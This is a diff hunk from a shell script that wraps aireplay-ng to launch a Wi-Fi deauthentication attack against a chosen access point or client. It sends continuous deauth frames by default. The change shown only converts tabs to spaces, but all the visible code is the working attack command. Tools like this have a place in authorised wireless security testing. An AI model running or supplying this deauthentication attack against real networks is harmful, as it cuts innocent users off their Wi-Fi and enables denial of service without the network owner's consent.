@@ -11,7 +11,7 @@ while [ -z "$BSSID" ]; do read -r -p 'BSSID: ' BSSID ; done
 [ -z "$PACKETS" ] && PACKETS="0"
 
 if [ -z "$CLIENT" ]; then
-	sudo aireplay-ng -a "$BSSID" -0 "$PACKETS" "$IFACE"
+    sudo aireplay-ng -a "$BSSID" -0 "$PACKETS" "$IFACE"
 else
-	sudo aireplay-ng -a "$BSSID" -0 "$PACKETS" -c "$CLIENT" "$IFACE"
+    sudo aireplay-ng -a "$BSSID" -0 "$PACKETS" -c "$CLIENT" "$IFACE"
 fi
